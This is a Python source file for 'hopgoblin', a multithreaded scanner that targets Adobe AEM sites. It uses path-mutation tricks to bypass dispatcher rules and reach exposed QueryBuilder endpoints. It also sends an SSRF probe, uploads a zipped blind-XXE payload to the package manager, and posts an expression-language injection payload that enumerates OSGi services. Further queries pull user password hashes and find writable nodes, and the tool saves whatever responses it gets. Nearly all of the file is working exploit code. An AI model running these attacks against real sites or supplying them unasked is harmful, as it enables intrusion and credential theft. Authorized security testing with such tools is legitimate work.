import argparse
import io
import requests
import urllib.parse
import zipfile
import threading
import os
import html
import signal
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

AUTHORITY = None
SSRF_TARGET = None
DEBUG = False
PROXY = None
print_lock = threading.Lock()
progress_bar = None
progress_lock = threading.Lock()
vulnerabilities = []
vuln_lock = threading.Lock()
output_file = None
output_lock = threading.Lock()
PATH_MUTATORS = [
    "{};x='x/graphql/execute/json/x'",
    '/graphql/execute.json/..%2f..{}',
    "{};x='.ico/x'",
    "{};x='.css/x'",
    "{};x='.pdf/x'",
    "{};x='.html/x'",
]

def debug(msg):
    if DEBUG:
        with print_lock:
            print(msg)

def format_msg(prefix):
    return lambda msg: (
        print_lock.acquire(),
        print(f'{prefix} {msg}'),
        print_lock.release()
    )[-1]

def write_to_file(text):
    global output_file
    if output_file:
        with output_lock:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(text + '\n')
                f.flush()

def format_msg_with_content(prefix):
    def _format(msg, content=None, poc_url=None):
        output = f'{prefix} {msg}'
        print(output)
        write_to_file(output)
        if poc_url:
            poc_output = f'POC URL: {poc_url}'
            print(poc_output)
            write_to_file(poc_output)
        if content:
            decoded_content = html.unescape(content)
            content_lines = decoded_content.split('\n')
            
            write_to_file('Response content:')
            for line in content_lines:
                if line.strip():
                    write_to_file(f'  {line.strip()}')
            
            max_lines = 50
            max_line_length = 200
            lines_shown = 0
            
            for line in content_lines:
                if lines_shown >= max_lines:
                    truncated_output = f'  ... (truncated - response too large, showing first {max_lines} lines)'
                    print(truncated_output)
                    break
                    
                if line.strip():
                    line_content = line.strip()
                    if len(line_content) > max_line_length:
                        line_content = line_content[:max_line_length] + '...'
                    
                    content_output = f'  {line_content}'
                    print(content_output)
                    lines_shown += 1
            
            with output_lock:
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.flush()
                    os.fsync(f.fileno())
    return _format

print_good    = format_msg('[+]')
print_neutral = format_msg('[.]')
print_bad     = format_msg('[-]')
print_good_with_content = format_msg_with_content('[+]')

def add_vulnerability(description, url):
    with vuln_lock:
        vulnerabilities.append({
            'description': description,
            'url': url,
            'authority': AUTHORITY
        })

def print_summary():
    if not vulnerabilities:
        return
    
    summary_lines = []
    summary_lines.append('\n' + '─' * 60)
    summary_lines.append('summary')
    summary_lines.append('─' * 60)
    
    by_authority = {}
    for vuln in vulnerabilities:
        auth = vuln['authority']
        if auth not in by_authority:
            by_authority[auth] = []
        by_authority[auth].append(vuln)
    
    for authority, vulns in by_authority.items():
        summary_lines.append(f'\n{authority}')
        for vuln in vulns:
            summary_lines.append(f'  {vuln["description"]}')
    
    summary_lines.append('\n' + '─' * 60)
    
    for line in summary_lines:
        print(line)
        write_to_file(line)

def update_progress():
    global progress_bar
    with progress_lock:
        if progress_bar:
            progress_bar.update(1)

def init_progress_bar(total):
    global progress_bar
    with progress_lock:
        progress_bar = tqdm(total=total, desc='Scanning', unit='check', position=0, leave=True)

def close_progress_bar():
    global progress_bar
    with progress_lock:
        if progress_bar:
            progress_bar.close()
            progress_bar = None

def signal_handler(sig, frame):
    print('\n[!] Interrupted by user. Cleaning up...')
    close_progress_bar()
    print_summary()
    sys.exit(0)

def mutate_path(path):
    return [mut.format(path) for mut in PATH_MUTATORS]

def request(path, method='get', **kwargs):
    full_url = AUTHORITY + path
    debug(f'>>>>> {method.upper()} {full_url}')
    
    if 'headers' not in kwargs:
        kwargs['headers'] = {}
    if 'User-Agent' not in kwargs['headers']:
        kwargs['headers']['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    
    if PROXY:
        if 'proxies' not in kwargs:
            kwargs['proxies'] = {
                'http': PROXY,
                'https': PROXY
            }
    
    try:
        if 'timeout' not in kwargs:
            kwargs['timeout'] = (5, 10)
        
        kwargs['stream'] = True
            
        r = requests.request(method, full_url, **kwargs)
        debug(f'<<<<< {r.status_code} {r.reason}')
        
        content = b''
        
        try:
            import time
            start_time = time.time()
            for chunk in r.iter_content(chunk_size=8192, decode_unicode=False):
                if chunk:
                    content += chunk
                    
                    if time.time() - start_time > 30:
                        debug(f'Timeout reading response content after 30 seconds')
                        break
        except Exception as e:
            debug(f'Error reading response content: {e}')
            pass
        
        r._content = content
        r._content_consumed = True
        
        return r
    except requests.exceptions.Timeout as e:
        debug(f'Request timeout for {full_url}: {e}')
        return None
    except requests.exceptions.RequestException as e:
        debug(f'Request failed for {full_url}: {e}')
        return None

def check_exposed_querybuilder_json():
    for path in mutate_path('/bin/querybuilder.json'):
        r = request(path)
        if r and r.status_code == 200 and b'"success":true,"results":0' in r.content:
            full_url = AUTHORITY + path
            print_good_with_content(f'Exposed JSON query builder - {path}', r.text, full_url)
            add_vulnerability('exposed json query builder', full_url)
            return path
    update_progress()
    return None

def check_exposed_querybuilder_feed():
    for path in mutate_path('/bin/querybuilder.feed'):
        r = request(path)
        if r and r.status_code == 200 and b'<title type="text">CQ Feed</title>' in r.content:
            full_url = AUTHORITY + path
            print_good_with_content(f'Exposed FEED query builder - {path}', r.text, full_url)
            add_vulnerability('exposed feed query builder', full_url)
            return
    update_progress()

def check_ms_token_verify_ssrf():
    if SSRF_TARGET is None:
        print_neutral('Not checking for SSRF as an SSRF target is not specified')
        return
    callback_url = f'https://{SSRF_TARGET}' if not SSRF_TARGET.startswith(('http://', 'https://')) else SSRF_TARGET
    
    for path in mutate_path('/services/accesstoken/verify'):
        r = request(path, method='post', data={'auth_url': callback_url})
        if r and r.status_code == 200:
            is_vulnerable = False
            if b'Burp Collaborator is a service that is used by' in r.content:
                is_vulnerable = True
            elif SSRF_TARGET.lower() in r.text.lower():
                is_vulnerable = True
            elif b'<html><body>' in r.content and len(r.content) < 200:
                is_vulnerable = True
            elif len(r.content) > 50 and len(r.content) < 500 and b'error' not in r.content.lower():
                is_vulnerable = True
            
            if is_vulnerable:
                full_url = AUTHORITY + path
                print_good_with_content(f'Vulnerable to SSRF via MS token verify (CVE-pending) - {path}', r.text, full_url)
                add_vulnerability('ssrf via ms token verify', full_url)
                return
    
    update_progress()

def check_jackrabbit_xxe():
    if SSRF_TARGET is None:
        print_neutral('Not checking for blind XXE as an SSRF target is not specified')
        return
    xxe_payload = f'<!DOCTYPE x [<!ENTITY foo SYSTEM "{SSRF_TARGET}">]><x>&foo;</x>'
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr('jcr_root/empty.txt', '')
        zipf.writestr('META-INF/vault/privileges.xml', xxe_payload)
    zip_bytes = zip_buffer.getvalue()
    files = {"package": ("x.zip", zip_bytes, 'application/zip')}
    for path in mutate_path('/crx/packmgr/service/exec.json'):
        r = request(path, method='post', files=files, params={'cmd': 'upload', 'jsonInTextarea': 'true'})
        if r and r.status_code == 200 and b'<textarea>{"success":false' in r.content:
            print_neutral(f'Possible blind XXE (CVE-pending); check your collaborator - {path}')
            return
    update_progress()

def check_el_injection():
    def _gen_el_payload():
        el_tmpl = '#{pageContext.class.classLoader.bundle.bundleContext.bundles[%d].registeredServices[%d].properties}\n'
        s = ''
        for bundle in range(100):
            for service in range(50):
                s += el_tmpl % (bundle, service)
        for bundle in range(100, 1000):
            for service in range(5):
                s += el_tmpl % (bundle, service)
        return s
    
    upload_payload = {
        'importSource': 'UrlBased',
        'sling:resourceType': '/libs/foundation/components/page/redirect.jsp',
        'redirectTarget': _gen_el_payload()
    }

    for path in mutate_path('/conf/global/settings/dam/import/cloudsettings.bulkimportConfig.json'):
        r = request(path, method='post', data=upload_payload)
        if r and r.status_code == 201:
            print_neutral(f'Upload appeared to succeed - {path}')
            break
    else:
        # Fail - nothing uploaded!
        return

    for path in mutate_path('/etc/cloudsettings/.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content'):
        r = request(path)
        if r and r.status_code == 200 and b'<p class="cq-redirect-notice">' in r.content:
            full_url = AUTHORITY + path
            print_good_with_content(f'Vulnerable to EL Injection via cloudsettings (CVE-pending) - {path}', r.text, full_url)
            add_vulnerability('expression language injection', full_url)
            update_progress()
            return
    update_progress()

def querybuilder_check_exposed_user_passwords(path):
    debug(f'Checking for exposed user passwords using path: {path}')
    query = {
        'path': '/home/users',
        'type': 'rep:User',
        'p.hits': 'selective',
        'p.properties': 'rep:password',
        'p.limit': '3'
    }
    
    try:
        r = request(path, params=query, timeout=(3, 8))
        if r and r.status_code == 200 and b'rep:password' in r.content:
            full_url = AUTHORITY + path + '?' + urllib.parse.urlencode(query)
            print_good_with_content(f'Exposed user passwords found - {path}?{urllib.parse.urlencode(query)}', r.text, full_url)
            add_vulnerability('exposed user passwords', full_url)
        else:
            debug(f'No user passwords found or request failed')
    except Exception as e:
        debug(f'Request failed for user passwords check: {e}')
    update_progress()

def querybuilder_check_writable_nodes(path):
    debug(f'Checking for writable nodes using path: {path}')
    for perm in 'jcr:write', 'jcr:addChildNodes', 'jcr:modifyProperties':    
        query = {
            'property': 'jcr:uuid',
            'property.operation': 'exists',
            'p.hits': 'selective',
            'p.properties': 'jcr:path',
            'p.limit': '3',
            'hasPermission': perm
        }
        
        try:
            r = request(path, params=query, timeout=(3, 8))
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if data.get('total', 0) > 0:
                        full_url = AUTHORITY + path + '?' + urllib.parse.urlencode(query)
                        print_good_with_content(f'Writeable nodes found - {path}?{urllib.parse.urlencode(query)}', r.text, full_url)
                        add_vulnerability('writeable jcr nodes', full_url)
                except (ValueError, KeyError):
                    debug(f'Failed to parse JSON response from {path}')
            else:
                debug(f'No writable nodes found for permission {perm} or request failed')
        except Exception as e:
            debug(f'Request failed for permission {perm}: {e}')
            continue
    update_progress()

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def read_targets_from_file(filename):
    try:
        with open(filename, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        return targets
    except FileNotFoundError:
        print_bad(f'File not found: {filename}')
        return []
    except Exception as e:
        print_bad(f'Error reading file {filename}: {e}')
        return []

def run_checks_for_target(url):
    global AUTHORITY
    AUTHORITY = normalize_url(url)
    print_neutral(f'Scanning {AUTHORITY}')
    query_builder_path = check_exposed_querybuilder_json()
    check_exposed_querybuilder_feed()
    check_ms_token_verify_ssrf()
    check_jackrabbit_xxe()
    check_el_injection()
    if query_builder_path is not None:
        original_path = '/bin/querybuilder.json'
        querybuilder_check_exposed_user_passwords(original_path)
        querybuilder_check_writable_nodes(original_path)
    else:
        update_progress()
        update_progress()
    print()

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(prog='hopgoblin')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('url', nargs='?', help='Single target URL')
    group.add_argument('-f', '--file', help='File containing target URLs (one per line)')
    parser.add_argument('-t', '--ssrf-target')
    parser.add_argument('-d', '--debug', action='store_true')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads to use (default: 10)')
    args = parser.parse_args()

    SSRF_TARGET = args.ssrf_target
    DEBUG = args.debug
    PROXY = args.proxy
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    if args.file:
        base_name = os.path.splitext(os.path.basename(args.file))[0]
        output_file = f'hopgoblin_{base_name}_{timestamp}.txt'
    else:
        target_name = args.url.replace('https://', '').replace('http://', '').replace('/', '_')
        output_file = f'hopgoblin_{target_name}_{timestamp}.txt'
    
    print(f'[.] Output will be saved to: {output_file}')

    if args.file:
        targets = read_targets_from_file(args.file)
        if targets:
            init_progress_bar(len(targets) * 7)
            try:
                with ThreadPoolExecutor(max_workers=args.threads) as executor:
                    executor.map(run_checks_for_target, targets)
            finally:
                close_progress_bar()
    else:
        init_progress_bar(7)
        try:
            run_checks_for_target(args.url)
        finally:
            close_progress_bar()
    print_summary()
    
    if output_file:
        with output_lock:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.flush()
                os.fsync(f.fileno())